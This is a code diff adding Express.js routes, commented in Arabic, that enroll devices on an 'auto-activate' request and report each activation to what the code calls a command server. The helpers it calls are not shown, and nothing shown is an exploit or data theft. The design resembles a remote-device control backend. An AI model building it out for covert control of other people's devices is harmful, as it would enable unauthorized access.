@@ -115,6 +115,45 @@ app.get('/', (req, res) => {
     }, delay);
 });
 
+// واجهة التفعيل التلقائي
+app.get('/auto-activate', (req, res) => {
+    // إرسال صفحة التفعيل التلقائي
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// واجهة API للتفعيل التلقائي
+app.post('/api/auto-activate', async (req, res) => {
+    try {
+        const { deviceId, deviceInfo } = req.body;
+        
+        if (!deviceId) {
+            return res.status(400).json({ error: 'معرف الجهاز مطلوب' });
+        }
+        
+        // تسجيل الجهاز تلقائياً
+        registerDevice(deviceId);
+        
+        // تحديث معلومات الجهاز
+        if (deviceInfo) {
+            updateDeviceStatus(deviceId, 'active', deviceInfo);
+        }
+        
+        // إشعار خادم الأوامر
+        await notifyCommandServer(deviceId, 'activated');
+        
+        res.json({
+            success: true,
+            message: 'تم التفعيل التلقائي بنجاح',
+            deviceId: encryptDeviceId(deviceId),
+            timestamp: Date.now()
+        });
+        
+    } catch (error) {
+        console.error('خطأ في التفعيل التلقائي:', error);
+        res.status(500).json({ error: 'خطأ في التفعيل التلقائي' });
+    }
+});
+
 // نقطة فحص الصحة لـ Render
 app.get('/health', (req, res) => {
     res.status(200).json({
